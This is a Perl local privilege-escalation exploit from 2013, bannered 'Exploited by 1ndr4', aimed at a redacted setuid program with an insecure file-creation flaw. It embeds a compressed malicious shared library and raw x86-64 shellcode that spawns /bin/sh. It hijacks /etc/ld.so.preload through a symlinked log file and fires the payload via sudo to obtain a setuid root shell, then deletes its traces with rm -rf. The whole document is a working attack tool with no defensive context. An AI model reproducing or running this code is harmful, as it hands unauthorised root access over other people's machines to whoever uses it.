#!/usr/bin/perl
use Fcntl ":mode";
use IO::Handle;

my $banner = 
"###########################################################################\n".
"#####          Local root exploit s******* command in S*****          #####\n".
"#####                        - Insecure file creation vulnerability - #####\n".
"#####                                                                 #####\n".
"#####                                                      2013.05.31 #####\n".
"#####                                              Exploited by 1ndr4 #####\n".
"###########################################################################\n";

my $suidfile = "/home/s*****/bin/s*******";
my $target = "/etc/ld.so.preload";

my $bz2name = "/tmp/evil.so.bz2";
my $evil_bin = "/tmp/evil.so";
my $logfile = "/tmp/log/." . `date +"%Y%m%d" | tr "\n" "."` ."log";
my $shellname = "/tmp/.1ndr4-root";

my @cfiles = ($suidfile, "/usr/bin/bzip2");
my @perms = (S_ISUID, S_IXOTH);

# ##################### 64BIT binary
# const char *rs = "/tmp/.1ndr4-root"
# void __attribute__((constructor)) init(void) {
# setgid(0); setuid(0); chown(rs, 0, 0); chmod(rs, 06777); }
my $bz2bin = 
"\x42\x5A\x68\x39\x31\x41\x59\x26\x53\x59\xA8\xBE\xF0\x40\x00\x01".
"\xE8\x7F\xFF\xFF\xFF\xDC\xFD\xF4\x47\xE5\x49\x57\xD5\x0A\xD4\xBF".
"\xF7\xFE\x64\xD0\x72\x14\x00\x00\x20\x40\x49\x08\x00\x53\x30\x0A".
"\x4C\x63\xC1\xC0\x01\xDD\xA6\x9B\x24\x1A\x99\x26\xA4\xD9\x46\x8D".
"\x34\xF4\x40\x69\xA0\x1A\x03\x40\x69\xA0\x68\x1A\x1E\xA3\x46\x21".
"\xA0\x69\x90\xDA\x9A\x68\x7A\x40\x6D\x26\x83\x50\x83\x20\xD2\x30".
"\x29\xE9\x3D\x4D\x1A\x34\xD0\x00\xD0\x00\xD0\x00\x00\x34\x00\x03".
"\x20\x00\x00\xE0\x00\x1A\x00\x06\x80\xC8\x00\x00\x1A\x00\x03\x4D".
"\x00\x00\x00\x00\x1A\x00\x31\x22\xA6\x4C\x99\x06\x83\x26\x80\x69".
"\xA0\x34\xD0\x00\x00\x00\x00\x00\x00\x00\x00\x03\x4C\x55\x10\x1C".
"\xF4\x90\x41\x21\x19\x8B\x20\x8A\x8D\x01\xF6\x7E\xF2\xB6\xE8\x5D".
"\x16\x14\x5B\x09\x5B\x50\x5E\x2B\x1A\x3C\x98\x92\x2C\x22\x81\x84".
"\x1A\xFA\x49\x8A\x14\xAF\x02\xBA\x68\x63\x0A\x95\xFC\x6C\x79\x71".
"\x25\x92\x59\xCA\x91\xDA\x07\xCF\x82\x69\xE8\xB2\xBA\xA4\x01\x59".
"\xD5\xAE\x24\x8A\x69\x30\x43\xAE\x2C\x58\x02\x04\x24\xF4\x16\x1A".
"\x90\x9D\x09\x98\x09\xA8\x11\x7B\x32\x2C\x47\xC0\x50\xD0\x13\xEC".
"\xE7\x09\xF3\x6C\xC4\x80\x4C\x72\x81\x7A\x24\x32\x30\xD1\x24\x81".
"\x44\x85\xAA\x04\x55\x9B\x49\x4E\x00\x0D\xA2\x01\x13\xE6\x4B\x6B".
"\x2D\xAE\x84\xAE\xF5\x96\x4D\x1A\x04\x31\x38\xD8\x09\x08\xEC\xA6".
"\xD0\x32\x41\x99\x33\x79\x11\x0F\x20\xBE\x32\xF4\xE5\x36\xB9\x88".
"\x12\xF4\x90\x47\xA3\xA4\x3C\x46\x4E\x7C\x2C\xF7\x81\x00\x04\x48".
"\x13\xC8\x9A\x34\x01\x01\xA2\xA3\x98\xE3\x11\x01\x34\x04\xC8\x19".
"\x93\x81\x90\x44\x48\x41\xE8\x39\x66\xA0\x43\x7F\x26\xC0\x5F\x32".
"\xC5\x37\xB6\xA9\xAA\x02\x26\xA0\x90\x85\x08\x60\x4B\xB2\x83\x02".
"\xB9\x27\x3A\xE7\x84\xF7\xF3\xE3\xAC\x23\x20\x24\x91\x55\xF8\x61".
"\x60\xC9\x8D\x91\xBE\x25\xD2\xBA\x47\x59\x19\x05\x28\xFB\xE1\xAE".
"\x17\x29\x8A\x9E\x02\xD1\x87\x3F\x25\xC3\xC0\x44\xA2\xD8\x2F\x22".
"\x61\xBA\x71\x7B\x55\x42\x84\x34\xD6\x0E\x06\x45\xAF\xAD\x17\xF4".
"\x8A\x75\xB1\xA1\xE3\x04\xDD\x88\xE9\x59\x46\x69\xB7\xA2\x9D\xC5".
"\xCC\x47\xA8\xB0\xA8\xA3\xE0\xC6\xC2\x94\xAC\x5C\x20\x8A\x8D\xDB".
"\xA8\x16\x23\x47\x05\xF3\x50\x24\xA5\x77\x4F\xAE\xE9\x0B\xB0\x17".
"\x4E\xAC\xA6\xCC\x9E\xC0\xB0\x42\xA2\xA8\x6A\x74\xA2\xBF\xA2\xE3".
"\xBE\xAE\x44\x17\x7D\xD0\xAB\x26\x70\x6C\x40\xD4\x65\xA0\xE5\xE4".
"\x09\x2B\x26\x69\x66\xB0\x14\x0C\x06\xEA\x58\xCB\x98\xD1\xDE\x27".
"\x95\x1A\xF4\x4F\x6D\x3A\x81\x0F\x66\xFD\xFA\x55\x5E\xD0\x10\x94".
"\x2A\xC5\xFE\x0F\x94\x4E\x71\x3A\xE5\x6D\x1F\x81\x18\x48\x31\x5E".
"\x6B\xB0\xBF\x1D\xAE\xC3\xB0\x20\x42\x04\xEC\x4B\xDF\x67\xE2\xC4".
"\xE9\x10\x45\x93\x16\x75\xBF\xC5\xDC\x91\x4E\x14\x24\x2A\x2F\xBC".
"\x10\x00";

# ##################### 64BIT binary
my $shellbin = 
"\x7F\x45\x4C\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x02\x00\x3E\x00\x01\x00\x00\x00\x80\x00\x40\x00\x00\x00\x00\x00".
"\x40\x00\x00\x00\x00\x00\x00\x00\x18\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x40\x00\x38\x00\x02\x00\x40\x00\x03\x00\x02\x00".
"\x01\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00".
"\x07\x01\x00\x00\x00\x00\x00\x00\x07\x01\x00\x00\x00\x00\x00\x00".
"\x00\x00\x20\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00".
"\x48\x31\xFF\x48\x89\xF8\xB0\x6A\x0F\x05\x48\x31\xFF\x48\x89\xF8".
"\xB0\x69\x0F\x05\xEB\x10\x5F\x48\x31\xD2\x48\x89\xD0\x52\x57\x48".
"\x89\xE6\xB0\x3B\x0F\x05\xE8\xEB\xFF\xFF\xFF\x2F\x62\x69\x6E\x2F".
"\x73\x68";

foreach $file(@cfiles) {
	$ret = permcheck($file, $perms[$i++]);
	if($ret != 0) {
		print "[!] '$file' error.\n";
		exit(0);
	}
}
print $banner;
unlink($bz2name);
open(BZ2, "> $bz2name") or die("[!] Can't open file: $bz2name\n");
print(BZ2 $bz2bin) or die("[!] File write error: $bz2name\n");
close(BZ2);
unlink($evil_bin);
system("bzip2 -d $bz2name");
unlink($shellname);
open(SHELL, "> $shellname") or die ("[!] Can't open file: $shellname\n");
print(SHELL $shellbin) or die("[!] File write error: $shellname\n");
close(SHELL);
# preparing
system("rm -rf /tmp/log; mkdir /tmp/log; ln -sf $target $logfile");
# change the permission & wrting evil library
system("HOME=/tmp $suidfile; sleep 1; echo $evil_bin> $target");
# exploit
system("sudo -l 2>&1 >/dev/null");

my $success = 0;

if(($ret = permcheck($shellname, S_ISUID)) == 0) {
	print "[*] Voila~! I'm r00t!\n";
	$success = 1;
	system("echo \"rm -rf $target\nsleep 2\nrm -rf $shellname\n\" | $shellname &");
	system($shellname);
}

if($success == 0) {
	print "\n[!] Exploit failed.\n";
}

cleanup:
system("rm -rf $shellname $evil_bin /tmp/log");
exit(0);

sub permcheck {
	my $perm;
	$perm = (stat($_[0]))[2];
	if($perm & $_[1]) {
		return 0;
	} else {
		return 1;
	}
}
